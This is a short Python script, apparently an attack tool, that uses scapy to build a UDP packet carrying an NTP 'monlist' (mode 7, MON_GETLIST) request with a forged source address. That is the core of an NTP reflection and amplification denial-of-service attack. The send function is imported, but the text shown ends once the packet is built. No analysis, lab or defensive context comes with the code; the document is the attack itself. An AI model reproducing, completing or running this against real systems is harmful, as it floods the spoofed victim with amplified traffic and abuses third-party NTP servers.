from scapy.all import IP, UDP, Raw, send

spoofed_source_ip = "1.11.0.3"
target_ip = "27.98.0.3"
ntp_port = 123

# NTP v2, Mode 7 (Private), Request, Implementation 3 (ntpdc), ReqCode 42 (MON_GETLIST)
monlist_payload = b'\x17\x00\x03\x2a' + b'\x00' * 44

packet = (
    IP(src=spoofed_source_ip, dst=target_ip) /
    UDP(sport=54321, dport=ntp_port) /
    Raw(load=monlist_payload)
)
